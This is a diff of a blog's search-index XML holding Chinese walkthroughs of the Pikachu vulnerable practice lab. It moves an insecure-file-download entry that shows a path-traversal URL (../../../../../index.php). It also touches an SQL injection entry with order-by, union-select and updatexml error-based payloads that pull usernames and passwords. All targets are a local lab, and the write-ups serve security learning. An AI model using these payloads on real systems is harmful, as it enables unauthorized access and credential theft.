@@ -761,6 +761,24 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-不安全的文件下载</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
+    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
+<p><img src="/images%5Cimage-20230110105403955.png" alt="image-20230110105403955"></p>
+<p>文件下载的url为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>
+
+<p>如果未做好限制，则会造成任意文件下载</p>
+<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images%5Cimage-20230110105601275.png" alt="image-20230110105601275"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-sql注入</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/sql%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h1 id="sql注入概述"><a href="#sql注入概述" class="headerlink" title="sql注入概述"></a>sql注入概述</h1><p>sql注入，就是通过将服务器查询数据库的那一部分代码，传入恶意payload进行拼接，从而执行想要的命令</p>
@@ -790,12 +808,12 @@
 <p>通过上述两个payload可以判断存在数字型的SQL注入</p>
 <h3 id="猜字段数"><a href="#猜字段数" class="headerlink" title="猜字段数"></a>猜字段数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order by 2		# 正常</span><br><span class="line">id=1 order by 3		# 异常</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images%5Cimage-20230109111919855.png" alt="image-20230109111919855"></p>
-<h5 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h5><p><img src="/images%5Cimage-20230109112009321.png" alt="image-20230109112009321"></p>
+<p><img src="/images/image-20230109111919855.png" alt="image-20230109111919855"></p>
+<h5 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h5><p><img src="/images/image-20230109112009321.png" alt="image-20230109112009321"></p>
 <p>order by后面的数字表示根据第几列进行排序</p>
-<p><img src="/images%5Cimage-20230109112302345.png" alt="image-20230109112302345"></p>
+<p><img src="/images/image-20230109112302345.png" alt="image-20230109112302345"></p>
 <p>所以当order by指定的列不存在时，就会报错</p>
-<p><img src="/images%5Cimage-20230109112352909.png" alt="image-20230109112352909"></p>
+<p><img src="/images/image-20230109112352909.png" alt="image-20230109112352909"></p>
 <h3 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h3><p>上述判断出存在两个字段，就可以构造payload</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0 union select 1,database()</span><br><span class="line"></span><br><span class="line">id=1 union select 1,database()</span><br></pre></td></tr></table></figure>
 
@@ -1338,24 +1356,6 @@
 <p>拼接和insert注入相同，这里就不分析了</p>
 <p><img src="/images%5Cimage-20230109224038685.png" alt="image-20230109224038685"></p>
 <h5 id="猜字段信息-1"><a href="#猜字段信息-1" class="headerlink" title="猜字段信息"></a>猜字段信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sex=&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select username from users limit 0,1),&#x27;~&#x27;),1) or &#x27;</span><br><span class="line"></span><br><span class="line">sex=&#x27; or updatexml(1,concat(&#x27;~&#x27;,(select password from users limit 1,1),&#x27;~&#x27;),1) or &#x27;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-不安全的文件下载</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
-    <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
-<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>抓取下载功能的数据包</p>
-<p><img src="/images%5Cimage-20230110105403955.png" alt="image-20230110105403955"></p>
-<p>文件下载的url为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=mbl.png</span><br></pre></td></tr></table></figure>
-
-<p>如果未做好限制，则会造成任意文件下载</p>
-<h5 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../../index.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images%5Cimage-20230110105601275.png" alt="image-20230110105601275"></p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
